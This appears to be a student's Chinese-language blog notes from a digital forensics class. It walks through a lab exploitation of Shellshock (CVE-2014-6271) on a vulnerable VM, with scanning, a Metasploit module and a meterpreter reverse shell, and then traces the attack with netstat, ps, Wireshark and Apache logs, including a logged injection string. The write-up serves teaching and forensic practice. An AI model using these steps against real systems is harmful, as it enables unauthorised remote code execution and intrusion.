---
---
title: 數位鑑識筆記 - Shellshock
date: 2021/12/05
tags: 
  - Digital forensics
  - Linux
categories: 筆記
comments: true
description:
top_img: https://imgur.com/4WtLHTa.jpg
cover: https://imgur.com/4WtLHTa.jpg
---
## 導言
最近正在上學校裡上數位鑑識相關課程
老師推薦的學習方式是每練習一次攻擊後，得利用各種工具及指令找出攻擊痕跡

所以這一系列的筆記總共會分為兩個部分
* 攻擊過程
* 鑑識過程

事不宜遲，總共約一個月的課程，期望自己能每次上完課都能更新:laughing:

---
## 主題
本次練習的攻擊手法為[**Shellshock**(CVE-2014-6271)](https://zh.wikipedia.org/wiki/Shellshock)
<img src="https://imgur.com/5WKRpL0.png" width="50%" height="50%">
這邊引述一下維基百科的介紹
>Shellshock，又稱Bashdoor[1]，是在Unix中廣泛使用的Bash shell中的一個安全漏洞[2]，首次於2014年9月24日公開。許多網際網路守護行程，如網頁伺服器，使用bash來處理某些命令，從而允許攻擊者在易受攻擊的Bash版本上執行任意代碼。這可使攻擊者在未授權的情況下存取電腦系統[3]。 --引用自維基百科

這次受害者的環境是講師所提供的iso檔
來自*PENTESTER LAB*，可至此網站下載一模一樣的練習環境
[Pentester Lab: CVE-2014-6271: ShellShock](https://www.vulnhub.com/entry/pentester-lab-cve-2014-6271-shellshock,104/)
```shell
$ cat /proc/version
Linux version 3.14.1-pentesterlab (root@builder32) (gcc version 4.4.5 (Debian 4.4.5-8) ) #1 SMP Sun Jul 6 09:16:00 EST 2014
```

### 安裝此環境
第一次看到這麼小的iso我都還不知道怎麼安裝(約30MB左右)，原來這東西就跟我們裝開機蝶的那種環境類似
直接新增一台虛擬機的環境下，並載入就好它會自行啟動配置好了

<img src="https://imgur.com/h3F9pfM.png" width="50%" height="50%">

---
## 攻擊

#### 需先準備軟體
1. **nmap**
2. **nikto**
3. **arp-scan**
4. **metasploit**
基本上準備個Kali Linux就能操作這次攻擊

### 攻擊流程

#### 1. 先使用**arp-scan**找到我們的目標主機
這一步也可使用各種工具找到對方即可
或是直接在目標主機輸入ifconfig
```shell
$ sudo arp-scan -l         
[sudo] password for susu: 
Interface: eth0, type: EN10MB, MAC: ***********, IPv4: 192.168.20.134
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.20.1	00:50:56:c0:00:08	VMware, Inc.
192.168.20.2	00:50:56:e6:11:13	VMware, Inc.
192.168.20.131	00:0c:29:86:4c:69	VMware, Inc. <------這次的目標
192.168.20.254	00:50:56:e3:02:85	VMware, Inc.
```

#### 2. 使用nmap尋找目標主機有哪些服務
```shell
$ nmap -A 192.168.20.131
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-05 15:35 CST
Nmap scan report for 192.168.20.131
Host is up (0.0013s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.0 (protocol 2.0)
| ssh-hostkey: 
|   1024 8b:4c:a0:14:1c:3c:8c:29:3a:16:1c:f8:1a:70:2a:f3 (DSA)
|   2048 d9:91:5d:c3:ed:78:b5:8c:9a:22:34:69:d5:68:6d:4e (RSA)
|_  256 b2:23:9a:fa:a7:7a:cb:cd:30:85:f9:cb:b8:17:ae:05 (ECDSA)
80/tcp open  http    Apache httpd 2.2.21 ((Unix) DAV/2)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.2.21 (Unix) DAV/2
|_http-title: [PentesterLab] CVE-2014-6271

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.13 seconds
```

#### 3. 尋找弱點
從nmap中我們可發現web服務的存在，我們再使用主要用來掃網頁用的**nikto**來進一步的掃描
```shell
$ nikto -h 192.168.20.131
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.20.131
+ Target Hostname:    192.168.20.131
+ Target Port:        80
+ Start Time:         2021-12-05 15:35:33 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/2.2.21 (Unix) DAV/2
+ Server may leak inodes via ETags, header found with file /, inode: 7725, size: 1704, mtime: Thu Sep 25 17:56:50 2014
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.2.21 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Uncommon header '93e4r0-cve-2014-6278' found, with contents: true
+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ 8725 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2021-12-05 15:36:01 (GMT8) (28 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
我們可在報告中發現在``/cgi-bin/status``有可疑漏洞
```shell
+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
```

#### 4. 使用metasploit進行攻擊

##### (1) **啟動metasploit並尋找shellshock相關攻擊**
```shell
$ msfconsole
msf6 > search shellshock

Matching Modules
================

   #   Name                                               Disclosure Date  Rank       Check  Description
   -   ----                                               ---------------  ----       -----  -----------
   0   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection (Shellshock)
   1   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
   2   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   3   exploit/multi/http/cups_bash_env_exec              2014-09-24       excellent  Yes    CUPS Filter Bash Environment Variable Code Injection (Shellshock)
   4   auxiliary/server/dhclient_bash_env                 2014-09-24       normal     No     DHCP Client Bash Environment Variable Code Injection (Shellshock)
   5   exploit/unix/dhcp/bash_environment                 2014-09-24       excellent  No     Dhclient Bash Environment Variable Injection (Shellshock)
   6   exploit/linux/http/ipfire_bashbug_exec             2014-09-29       excellent  Yes    IPFire Bash Environment Variable Injection (Shellshock)
   7   exploit/multi/misc/legend_bot_exec                 2015-04-27       excellent  Yes    Legend Perl IRC Bot Remote Code Execution
   8   exploit/osx/local/vmware_bash_function_root        2014-09-24       normal     Yes    OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection (Shellshock)
   9   exploit/multi/ftp/pureftpd_bash_env_exec           2014-09-24       excellent  Yes    Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock)
   10  exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection (Shellshock)
   11  exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution


Interact with a module by name or index. For example info 11, use 11 or use exploit/multi/misc/xdh_x_exec

```
我們可在看到 1 為我們想要進行的攻擊

``   1   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
``

##### (2) **use 我們找到的辦法**
可注意到我們的所選的方法變成了紅字了
<pre><u style="text-decoration-style:single">msf6</u> &gt; use exploit/multi/http/apache_mod_cgi_bash_env_exec
<font color="#277FFF"><b>[*]</b></font> No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
<u style="text-decoration-style:single">msf6</u> exploit(<font color="#EC0101"><b>multi/http/apache_mod_cgi_bash_env_exec</b></font>) &gt; 
</pre>

##### (3) **設定options**
先輸入
```shell
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > show options

Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   CMD_MAX_LENGTH  2048             yes       CMD max line length
   CVE             CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
   HEADER          User-Agent       yes       HTTP header to use
   METHOD          GET              yes       HTTP method to use
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPATH           /bin             yes       Target PATH for binaries used by the CmdStager
   RPORT           80               yes       The target port (TCP)
   SRVHOST         0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT         8080             yes       The local port to listen on.
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI                        yes       Path to CGI script
   TIMEOUT         5                yes       HTTP read response timeout (seconds)
   URIPATH                          no        The URI to use for this exploit (default is random)
   VHOST                            no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.20.134   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux x86
```

我們需要設定以下這幾個options
* **lhost** 攻擊者ip
* **rhost** 目標主機ip
* **payload** 攻擊成功後要做的動作
* **targeturi** 目標的漏洞網頁

```shell
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set lhost 192.168.20.134
lhost => 192.168.20.134
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rhost 192.168.20.131
rhost => 192.168.20.131
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set targeturi http://192.168.20.131/cgi-bin/status
targeturi => http://192.168.20.131/cgi-bin/status

```
至此，攻擊的準備工作完成了

*題外話*

常常我們都把**exploit**、**auxiliary**、**payload**搞混

講師用了一個講法我覺得很容易懂，分享一下
|           |  |
| ----------| --- |
| exploit   | 槍 |
| auxiliary | 輔助工具 |
| payload   | 子彈 |
子彈(payload)無法主動攻擊，需要有槍(exploit)的輔助才行
子彈(payload)可以理解攻擊進入後目標電腦，我們要幹什麼壞事或提權
而槍(exploit)可以自己進行攻擊，例如用~~槍托打人~~
輔助工具(auxiliary)也可以，例如槍掛榴彈

##### (4) **攻擊**
在攻擊前，我們也可以開始啟用相關的監測軟體，基本上是把你想到的都打開看看
我這邊想到的是，可以透過Wireshark抓取之間的封包
完成了之後，可以輸入run指令開始攻擊

<pre><u style="text-decoration-style:single">msf6</u> exploit(<font color="#EC0101"><b>multi/http/apache_mod_cgi_bash_env_exec</b></font>) &gt; run

<font color="#277FFF"><b>[*]</b></font> Started reverse TCP handler on 192.168.20.134:4444 
<font color="#277FFF"><b>[*]</b></font> Command Stager progress - 100.46% done (1097/1092 bytes)
<font color="#277FFF"><b>[*]</b></font> Sending stage (984904 bytes) to 192.168.20.131
<font color="#277FFF"><b>[*]</b></font> Meterpreter session 1 opened (192.168.20.134:4444 -&gt; 192.168.20.131:56191) at 2021-12-05 16:36:00 +0800

<u style="text-decoration-style:single">meterpreter</u> &gt; 
</pre>
至此，攻擊成功
我們可輸入``shell``變成指令介面
便可開始操作目標電腦
```shell
meterpreter > shell
Process 950 created.
Channel 1 created.
whoami
pentesterlab
who
pentesterlab    tty1            00:04   Dec  5 14:19:43  
```

---
## 鑑識

#### 需先準備軟體
1. **Wireshark**

我們在攻擊過後，便可在相關基礎設施中，尋找是否有殘餘的封包
在本次的練習中，我便開啟wireshark收集攻擊時的封包

#### Wireshark
在收集到的封包中，可得知 192.168.20.134 向 192.168.20.131 發送了奇怪的惡意內容
<img src="https://imgur.com/7EkR9KL.png" width="50%" height="50%">
完整內容
<img src="https://imgur.com/61dcxeu.png" width="50%" height="50%">

#### 在受害主機上尋找殘骸

##### 1. **查詢網路連接狀況**
```shell
$ netstat -a
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      
tcp        0      0 192.168.20.131:56191    192.168.20.134:4444     ESTABLISHED 
tcp        0      0 :::www                  :::*                    LISTEN      
tcp        0      0 :::ssh                  :::*                    LISTEN      
tcp        1      0 ::ffff:192.168.20.131:www ::ffff:192.168.20.134:34275 CLOSE_WAIT  
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node Path
unix  2      [ ACC ]     STREAM     LISTENING       7711 /var/run/acpid.socket
unix  2      [ ACC ]     SEQPACKET  LISTENING       6334 @/org/kernel/udev/udevd
unix  2      [ ACC ]     STREAM     LISTENING       7909 /usr/local/apache2/logs/cgisock.695
unix  3      [ ]         DGRAM                      6342 
unix  3      [ ]         STREAM     CONNECTED       8538 /usr/local/apache2/logs/cgisock.695
unix  3      [ ]         DGRAM                      6343 
unix  3      [ ]         STREAM     CONNECTED       8540 
```
可看到目前有一個可疑的ip連接中
``tcp        0      0 192.168.20.131:56191    192.168.20.134:4444     ESTABLISHED``
##### 2. **查詢可疑程式**
```shell
$ ps -ef
PID   USER     COMMAND
    1 root     init
    2 root     [kthreadd]
    3 root     [ksoftirqd/0]
    5 root     [kworker/0:0H]
    6 root     [kworker/u16:0]
    7 root     [rcu_sched]
    8 root     [rcu_bh]
    9 root     [migration/0]
   10 root     [khelper]
   11 root     [netns]
   12 root     [writeback]
   13 root     [ksmd]
   14 root     [bioset]
   15 root     [kblockd]
   16 root     [ata_sff]
   17 root     [khubd]
   18 root     [kworker/0:1]
   31 root     [kswapd0]
   32 root     [fsnotify_mark]
   33 root     [crypto]
   49 root     [nvme]
   50 root     [nvme]
   51 root     [scsi_eh_0]
   52 root     [scsi_tmf_0]
   53 root     [scsi_eh_1]
   54 root     [scsi_tmf_1]
   55 root     [kworker/u16:1]
   57 root     [kpsmoused]
   59 root     [deferwq]
   61 root     [kworker/0:3]
   92 root     /sbin/udevd --daemon
  382 root     [mpt_poll_0]
  400 root     [mpt/0]
  613 root     [ipv6_addrconf]
  614 root     /usr/local/sbin/sshd
  618 root     /usr/local/sbin/acpid
  640 root     [scsi_eh_2]
  641 root     [scsi_tmf_2]
  646 root     /sbin/udevd --daemon
  647 root     /sbin/udevd --daemon
  695 root     /usr/local/apache2/bin/httpd -f /etc/apache2/httpd.conf -k start
  696 penteste -sh
  702 root     /sbin/getty -l /usr/local/bin/autologin 9600 ttyS0 vt100
  742 penteste /usr/local/apache2/bin/httpd -f /etc/apache2/httpd.conf -k start
  743 penteste /usr/local/apache2/bin/httpd -f /etc/apache2/httpd.conf -k start
  744 penteste /usr/local/apache2/bin/httpd -f /etc/apache2/httpd.conf -k start
  745 penteste /usr/local/apache2/bin/httpd -f /etc/apache2/httpd.conf -k start
  839 root     /sbin/udhcpc -b -i eth0 -x hostname vulnerable -p /var/run/udhcpc.eth0.pid
  866 penteste /usr/local/apache2/bin/httpd -f /etc/apache2/httpd.conf -k start
  947 penteste {status} /bin/bash /var/www/cgi-bin/status
  948 penteste {status} /bin/bash /var/www/cgi-bin/status
  949 penteste /tmp/kENhE
  950 penteste /bin/sh
  974 penteste ps -ef
```
可看到有幾個看起來很可疑的程式
``947 penteste {status} /bin/bash /var/www/cgi-bin/status``
``948 penteste {status} /bin/bash /var/www/cgi-bin/status``
``949 penteste /tmp/kENhE``
``950 penteste /bin/sh``

```shell
$ sudo netstat -antp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      614/sshd
tcp        0      0 192.168.20.131:56191    192.168.20.134:4444     ESTABLISHED 949/kENhE <----原來是你
tcp        0      0 :::80                   :::*                    LISTEN      695/httpd
tcp        0      0 :::22                   :::*                    LISTEN      614/sshd
tcp        1      0 ::ffff:192.168.20.131:80 ::ffff:192.168.20.134:34275 CLOSE_WAIT  745/httpd
```
我們可猜測PID:949``/tmp/kENhE``便有可能是攻擊者的惡意程式
從攻擊方meterpreter確認，也是如此
```shell
meterpreter > getpid
Current pid: 949
meterpreter > getuid
Server username: pentesterlab @ vulnerable (uid=1000, gid=50, euid=1000, egid=50)
```

---
## 補充
這篇所練習的PENTESTER LAB所提供的環境似乎太過精簡 :joy:
以至log似乎也未開啟，這邊我再用 Metasploitable 2 再練習一遍
由於他本身沒有自帶這個漏洞
可參考這個網站建立一個shellshock漏洞 
[How To Exploit Shellshock On Metasploitable 2](https://ethicalhackingguru.com/how-to-exploit-shellshock-on-metasploitable-2/)

#### Log
我們直接搜尋可疑的ip位置
```shell
$ grep -rin "192.168.20.134" /var/Log
/var/log/apache2/access.log:100917:192.168.20.134 - - [05/Dec/2021:05:48:57 -0500] "GET /cgi-bin/shellshock.sh HTTP/1.1" 200 78 "-" "() { :;};echo -e \"\\r\\n6IGVbPatgU0YWrp4sXdi$(echo -en \\\\x7f\ <----省略之前所看到的exploit
```
可找到apache的**access.log**裡面有接收到來自的192.168.20.134的exploit
*題外話*
如果log太長，可以直接讓grep輸出到別的檔案，再拿出來看分析就好
``grep -rinR "192.168.20.134" /var/log > out.txt``